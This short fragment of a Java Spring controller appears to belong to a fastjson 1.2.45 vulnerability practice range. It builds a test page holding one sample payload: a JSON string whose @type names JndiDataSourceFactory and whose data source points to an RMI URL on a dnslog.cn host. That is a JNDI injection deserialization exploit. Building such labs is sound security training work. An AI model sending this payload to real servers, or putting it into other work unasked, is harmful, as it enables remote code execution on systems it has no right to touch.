...
public class FastjsonController {
    ...
    @GetMapping(value = {"/", "/fastjson-1.2.45"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        return buildPage(
                "fastjson-1.2.45 靶场测试页",
                "/fastjson1.2.45-process",
                new String[]{
                        "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://fastjson1.2.45-process.dnslog.cn/Exploit\"}}"
                },
